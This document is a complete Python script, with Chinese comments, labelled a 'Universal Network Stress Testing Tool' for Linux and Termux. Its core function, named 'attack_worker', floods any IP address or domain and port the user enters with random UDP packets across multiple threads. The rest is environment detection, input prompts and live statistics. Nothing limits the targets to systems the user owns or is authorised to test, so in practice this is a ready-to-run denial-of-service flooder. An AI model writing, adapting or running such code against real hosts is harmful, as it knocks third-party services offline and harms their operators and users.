#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Universal Network Stress Testing Tool
Linux & Termux Compatible Version v3.0
Author: Security Testing Tool
"""

import sys
import os
import time
import socket
import random
import threading
import queue
import platform
import subprocess
from datetime import datetime

class UniversalDetector:
    """通用环境检测器"""
    
    @staticmethod
    def detect_environment():
        """检测运行环境"""
        env_info = {
            'platform': platform.system(),
            'machine': platform.machine(),
            'python_version': platform.python_version(),
            'is_termux': False,
            'is_android': False,
            'is_linux': False,
            'is_windows': False,
            'has_root': False,
            'max_threads': 50,
            'max_packet_size': 64000,
            'default_threads': 10,
            'default_packet_size': 1024
        }
        
        # 检测Termux环境
        if os.path.exists('/data/data/com.termux'):
            env_info['is_termux'] = True
            env_info['is_android'] = True
            env_info['max_threads'] = 10
            env_info['max_packet_size'] = 4096
            env_info['default_threads'] = 3
            env_info['default_packet_size'] = 512
        
        # 检测Android
        elif os.path.exists('/system/bin/app_process'):
            env_info['is_android'] = True
            env_info['max_threads'] = 15
            env_info['max_packet_size'] = 8192
            env_info['default_threads'] = 5
            env_info['default_packet_size'] = 1024
        
        # 检测Linux
        elif env_info['platform'] == 'Linux':
            env_info['is_linux'] = True
            env_info['max_threads'] = 100
            env_info['max_packet_size'] = 64000
            env_info['default_threads'] = 20
            env_info['default_packet_size'] = 6400
        
        # 检测Windows
        elif env_info['platform'] == 'Windows':
            env_info['is_windows'] = True
            env_info['max_threads'] = 50
            env_info['max_packet_size'] = 32000
            env_info['default_threads'] = 10
            env_info['default_packet_size'] = 2048
        
        # 检测root权限
        try:
            if os.geteuid() == 0:
                env_info['has_root'] = True
        except:
            pass
        
        return env_info

class Colors:
    """通用颜色类 - 适配各种终端"""
    
    def __init__(self, env_info):
        self.enabled = self._check_color_support(env_info)
        
        if self.enabled:
            self.RED = '\033[91m'
            self.GREEN = '\033[92m'
            self.YELLOW = '\033[93m'
            self.BLUE = '\033[94m'
            self.PURPLE = '\033[95m'
            self.CYAN = '\033[96m'
            self.WHITE = '\033[97m'
            self.BOLD = '\033[1m'
            self.UNDERLINE = '\033[4m'
            self.END = '\033[0m'
            self.CLEAR_LINE = '\033[K'
        else:
            # 无色模式
            self.RED = self.GREEN = self.YELLOW = ''
            self.BLUE = self.PURPLE = self.CYAN = ''
            self.WHITE = self.BOLD = self.UNDERLINE = ''
            self.END = self.CLEAR_LINE = ''
    
    def _check_color_support(self, env_info):
        """检查终端颜色支持"""
        try:
            # 检查TERM环境变量
            if os.environ.get('TERM') in ['xterm', 'xterm-color', 'xterm-256color', 'screen']:
                return True
            
            # Termux通常支持颜色
            if env_info['is_termux']:
                return True
            
            # 检查是否是真实终端
            return sys.stdout.isatty()
        except:
            return False

class NetworkUtils:
    """网络工具类"""
    
    @staticmethod
    def resolve_target(target):
        """解析目标（IP或域名）"""
        try:
            # 清理输入
            target = target.strip()
            if target.startswith(('http://', 'https://')):
                target = target.split('://', 1)[1].split('/', 1)[0]
            
            # 检查是否是IP地址
            try:
                socket.inet_aton(target)
                return target, target, "IP"
            except socket.error:
                pass
            
            # 检查是否是IPv6
            try:
                socket.inet_pton(socket.AF_INET6, target)
                return target, target, "IPv6"
            except socket.error:
                pass
            
            # 域名解析
            try:
                ip = socket.gethostbyname(target)
                return target, ip, "DOMAIN"
            except socket.gaierror:
                # 尝试添加www前缀
                try:
                    ip = socket.gethostbyname(f"www.{target}")
                    return f"www.{target}", ip, "DOMAIN"
                except socket.gaierror:
                    pass
            
            return None, None, "FAILED"
            
        except Exception as e:
            return None, None, f"ERROR: {str(e)}"
    
    @staticmethod
    def validate_port(port):
        """验证端口"""
        try:
            port = int(port)
            return 1 <= port <= 65535
        except:
            return False
    
    @staticmethod
    def get_network_info():
        """获取网络接口信息"""
        try:
            # 尝试使用ip命令
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=3)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'default' in line:
                        return line.strip()
            
            # 尝试使用route命令
            result = subprocess.run(['route', '-n'], capture_output=True, text=True, timeout=3)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if '0.0.0.0' in line and 'UG' in line:
                        return line.strip()
            
            return "Unknown"
        except:
            return "Unknown"

class StatisticsManager:
    """统计管理器"""
    
    def __init__(self):
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.reset()
    
    def reset(self):
        """重置统计"""
        with self.lock:
            self.total_packets = 0
            self.success_packets = 0
            self.failed_packets = 0
            self.total_bytes = 0
            self.current_speed = 0.0
            self.peak_speed = 0.0
            self.last_update_time = time.time()
            self.last_packet_count = 0
    
    def update(self, packets=1, bytes_sent=0, success=True):
        """更新统计"""
        with self.lock:
            self.total_packets += packets
            self.total_bytes += bytes_sent
            
            if success:
                self.success_packets += packets
            else:
                self.failed_packets += packets
            
            # 计算当前速度
            current_time = time.time()
            time_diff = current_time - self.last_update_time
            
            if time_diff >= 1.0:  # 每秒更新一次速度
                packet_diff = self.total_packets - self.last_packet_count
                self.current_speed = packet_diff / time_diff
                self.peak_speed = max(self.peak_speed, self.current_speed)
                
                self.last_update_time = current_time
                self.last_packet_count = self.total_packets
    
    def get_stats(self):
        """获取当前统计"""
        with self.lock:
            elapsed = time.time() - self.start_time
            return {
                'total_packets': self.total_packets,
                'success_packets': self.success_packets,
                'failed_packets': self.failed_packets,
                'total_bytes': self.total_bytes,
                'current_speed': self.current_speed,
                'peak_speed': self.peak_speed,
                'elapsed_time': elapsed,
                'packets_per_second': self.total_packets / elapsed if elapsed > 0 else 0,
                'success_rate': (self.success_packets / self.total_packets * 100) if self.total_packets > 0 else 0
            }

class UniversalNetworkTester:
    """通用网络测试器"""
    
    def __init__(self):
        self.env_info = UniversalDetector.detect_environment()
        self.colors = Colors(self.env_info)
        self.stats = StatisticsManager()
        
        # 测试参数
        self.target_host = None
        self.target_ip = None
        self.target_port = None
        self.target_type = None
        self.threads = self.env_info['default_threads']
        self.packet_size = self.env_info['default_packet_size']
        self.duration = 0
        self.running = False
        self.display_queue = queue.Queue()
        
        # 性能调节
        self.send_delay = 0.001  # 发送延迟，避免系统过载
        self.stats_update_interval = 100  # 统计更新间隔
    
    def clear_screen(self):
        """清屏"""
        if self.env_info['is_windows']:
            os.system('cls')
        else:
            os.system('clear')
    
    def print_banner(self):
        """显示横幅"""
        banner = f"""
{self.colors.RED}{self.colors.BOLD}
╔════════════════════════════════════════════════════════════════╗
║                 Universal Network Testing Tool                 ║
║                    Linux & Termux Compatible                   ║
║                        Version 3.0                            ║
╚════════════════════════════════════════════════════════════════╝
{self.colors.END}
"""
        print(banner)
        
        # 显示环境信息
        env_str = f"{self.colors.CYAN}[*] 运行环境: {self.env_info['platform']}"
        if self.env_info['is_termux']:
            env_str += " (Termux)"
        elif self.env_info['is_android']:
            env_str += " (Android)"
        env_str += f" | Python: {self.env_info['python_version']}{self.colors.END}"
        print(env_str)
        
        if self.env_info['has_root']:
            print(f"{self.colors.YELLOW}[*] 当前以root权限运行{self.colors.END}")
        
        print(f"{self.colors.CYAN}[*] 网络: {NetworkUtils.get_network_info()}{self.colors.END}")
        print()
    
    def get_user_input(self):
        """获取用户输入"""
        self.clear_screen()
        self.print_banner()
        
        print(f"{self.colors.YELLOW}[*] 请输入测试参数 (支持IP地址和域名){self.colors.END}")
        
        # 获取目标
        while True:
            target = input(f"{self.colors.CYAN}[?] 目标主机 (IP或域名): {self.colors.END}").strip()
            if not target:
                continue
            
            original_host, ip, target_type = NetworkUtils.resolve_target(target)
            
            if ip:
                self.target_host = original_host
                self.target_ip = ip
                self.target_type = target_type
                print(f"{self.colors.GREEN}[✓] 解析成功: {original_host} → {ip} ({target_type}){self.colors.END}")
                break
            else:
                print(f"{self.colors.RED}[!] 无法解析目标: {target}{self.colors.END}")
        
        # 获取端口
        while True:
            port_input = input(f"{self.colors.CYAN}[?] 端口 (1-65535, 默认80): {self.colors.END}").strip() or "80"
            if NetworkUtils.validate_port(port_input):
                self.target_port = int(port_input)
                break
            print(f"{self.colors.RED}[!] 无效的端口{self.colors.END}")
        
        # 获取线程数
        max_threads = self.env_info['max_threads']
        default_threads = self.env_info['default_threads']
        
        while True:
            threads_input = input(f"{self.colors.CYAN}[?] 线程数 (1-{max_threads}, 默认{default_threads}): {self.colors.END}").strip() or str(default_threads)
            try:
                threads = int(threads_input)
                if 1 <= threads <= max_threads:
                    self.threads = threads
                    break
                print(f"{self.colors.RED}[!] 线程数必须在1-{max_threads}之间{self.colors.END}")
            except ValueError:
                print(f"{self.colors.RED}[!] 请输入有效的数字{self.colors.END}")
        
        # 获取数据包大小
        max_packet_size = self.env_info['max_packet_size']
        default_packet_size = self.env_info['default_packet_size']
        
        while True:
            packet_size_input = input(f"{self.colors.CYAN}[?] 数据包大小 (64-{max_packet_size}, 默认{default_packet_size}): {self.colors.END}").strip() or str(default_packet_size)
            try:
                packet_size = int(packet_size_input)
                if 64 <= packet_size <= max_packet_size:
                    self.packet_size = packet_size
                    break
                print(f"{self.colors.RED}[!] 数据包大小必须在64-{max_packet_size}之间{self.colors.END}")
            except ValueError:
                print(f"{self.colors.RED}[!] 请输入有效的数字{self.colors.END}")
        
        # 获取持续时间
        while True:
            duration_input = input(f"{self.colors.CYAN}[?] 持续时间 (秒, 0为手动停止, 默认30): {self.colors.END}").strip() or "30"
            try:
                self.duration = int(duration_input)
                if self.duration >= 0:
                    break
                print(f"{self.colors.RED}[!] 时间不能为负数{self.colors.END}")
            except ValueError:
                print(f"{self.colors.RED}[!] 请输入有效的数字{self.colors.END}")
        
        # 性能调节 - Termux优化
        if self.env_info['is_termux'] or self.env_info['is_android']:
            self.send_delay = 0.01
            self.stats_update_interval = 50
        
        # 显示配置摘要
        self.print_config_summary()
        
        input(f"\n{self.colors.CYAN}[*] 按Enter键开始测试...{self.colors.END}")
    
    def print_config_summary(self):
        """显示配置摘要"""
        print(f"\n{self.colors.YELLOW}[*] 配置摘要:{self.colors.END}")
        print(f"    目标: {self.target_host} ({self.target_ip}:{self.target_port})")
        print(f"    类型: {self.target_type}")
        print(f"    线程: {self.threads}")
        print(f"    数据包: {self.packet_size} bytes")
        print(f"    持续时间: {'手动控制' if self.duration == 0 else str(self.duration) + '秒'}")
        
        if self.env_info['is_termux']:
            print(f"    {self.colors.CYAN}Termux优化: 已启用{self.colors.END}")
    
    def display_worker(self):
        """显示工作线程"""
        last_display_time = time.time()
        
        while self.running or not self.display_queue.empty():
            try:
                current_time = time.time()
                if current_time - last_display_time >= 0.5:  # 每0.5秒更新
                    self.display_realtime_stats()
                    last_display_time = current_time
                
                time.sleep(0.1)
                
            except KeyboardInterrupt:
                break
            except Exception:
                break
    
    def display_realtime_stats(self):
        """显示实时统计"""
        stats = self.stats.get_stats()
        
        # 动态计算列宽
        total_width = 70
        if self.env_info['is_termux']:
            total_width = 60
        
        # 格式化输出
        display = f"""
{self.colors.CLEAR_LINE}{self.colors.CYAN}
╔{'═' * (total_width-2)}╗
║{' ' * ((total_width-18)//2)}实时测试数据{' ' * ((total_width-18)-(total_width-18)//2)}║
╠{'═' * (total_width-2)}╣
║ 目标: {self.target_host[:25]:<25} ({self.target_ip[:15]:<15}) ║
║ 端口: {self.target_port:<5} 类型: {self.target_type:<6} 线程: {self.threads:<3} ║
║                                                           ║
║ 发送: {stats['total_packets']:<10} 成功: {stats['success_packets']:<10} 失败: {stats['failed_packets']:<10} ║
║ 速率: {stats['current_speed']:<6.1f}/s 峰值: {stats['peak_speed']:<6.1f}/s 成功率: {stats['success_rate']:<5.1f}% ║
║ 流量: {(stats['total_bytes']/(1024*1024)):<6.2f} MB 时间: {stats['elapsed_time']:<6.1f}s{' ' * 10} ║
╚{'═' * (total_width-2)}╝
{self.colors.END}"""
        
        print(f"\r{display}", end='', flush=True)
    
    def attack_worker(self, worker_id):
        """攻击工作线程"""
        try:
            # 创建socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            
            # 准备数据包
            packet_data = random._urandom(self.packet_size)
            local_count = 0
            
            while self.running:
                try:
                    # 发送数据包
                    sock.sendto(packet_data, (self.target_ip, self.target_port))
                    self.stats.update(packets=1, bytes_sent=self.packet_size, success=True)
                    local_count += 1
                    
                    # 定期触发显示更新
                    if local_count % self.stats_update_interval == 0:
                        self.display_queue.put(True)
                    
                    # 发送延迟，避免系统过载
                    if self.send_delay > 0:
                        time.sleep(self.send_delay)
                        
                except (socket.error, socket.timeout):
                    self.stats.update(packets=1, bytes_sent=0, success=False)
                except KeyboardInterrupt:
                    break
                    
        except Exception as e:
            print(f"\n{self.colors.RED}[!] 线程{worker_id}错误: {e}{self.colors.END}")
        finally:
            try:
                sock.close()
            except:
                pass
    
    def timer_worker(self):
        """计时器工作线程"""
        if self.duration > 0:
            time.sleep(self.duration)
            print(f"\n{self.colors.YELLOW}[*] 达到设定时间，准备停止测试...{self.colors.END}")
            self.running = False
    
    def start_test(self):
        """开始测试"""
        self.clear_screen()
        self.print_banner()
        
        print(f"{self.colors.GREEN}[*] 正在初始化测试环境...{self.colors.END}")
        print(f"{self.colors.CYAN}[*] 启动 {self.threads} 个工作线程...{self.colors.END}")
        
        self.running = True
        self.stats.reset()
        
        # 启动显示线程
        display_thread = threading.Thread(target=self.display_worker)
        display_thread.daemon = True
        display_thread.start()
        
        # 启动计时器线程
        if self.duration > 0:
            timer_thread = threading.Thread(target=self.timer_worker)
            timer_thread.daemon = True
            timer_thread.start()
        
        # 启动工作线程
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(target=self.attack_worker, args=(i,))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            
            # 避免同时启动造成系统负载
            time.sleep(0.05)
        
        try:
            # 等待线程完成
            for thread in threads:
                thread.join(timeout=0.1)
                
        except KeyboardInterrupt:
            print(f"\n{self.colors.YELLOW}[*] 用户中断测试{self.colors.END}")
            self.running = False
            
        finally:
            self.running = False
            time.sleep(0.5)  # 等待清理
            self.print_final_report()
    
    def print_final_report(self):
        """打印最终报告"""
        stats = self.stats.get_stats()
        
        report = f"""
{self.colors.GREEN}
╔════════════════════════════════════════════════════════════════╗
║                        测试完成报告                            ║
╠════════════════════════════════════════════════════════════════╣
║ 测试目标: {self.target_host} ({self.target_ip}:{self.target_port})                            ║
║ 测试类型: {self.target_type} 压力测试                          ║
║                                                                ║
║ 统计信息:                                                      ║
║ ├─ 总发送数据包: {stats['total_packets']:,}                                          ║
║ ├─ 成功数据包: {stats['success_packets']:,} ({stats['success_rate']:.1f}%)                    ║
║ ├─ 失败数据包: {stats['failed_packets']:,}                                          ║
║ ├─ 总数据量: {(stats['total_bytes']/(1024*1024)):.2f} MB                              ║
║ ├─ 平均速率: {stats['packets_per_second']:.1f} packets/sec                         ║
║ ├─ 峰值速率: {stats['peak_speed']:.1f} packets/sec                          ║
║ └─ 持续时间: {stats['elapsed_time']:.1f} 秒                                    ║
╚════════════════════════════════════════════════════════════════╝
{self.colors.END}
"""
        print(report)

def main():
    """主函数"""
    try:
        # 创建测试器
        tester = UniversalNetworkTester()
        
        # 获取用户输入
        tester.get_user_input()
        
        # 开始测试
        tester.start_test()
        
    except KeyboardInterrupt:
        print(f"\n{tester.colors.YELLOW}[*] 程序被用户中断{tester.colors.END}")
    except Exception as e:
        print(f"\n{tester.colors.RED}[!] 程序错误: {e}{tester.colors.END}")
        import traceback
        traceback.print_exc()
    finally:
        print(f"{tester.colors.CYAN}[*] 程序结束，感谢使用网络测试工具{tester.colors.END}")

if __name__ == "__main__":
    main()
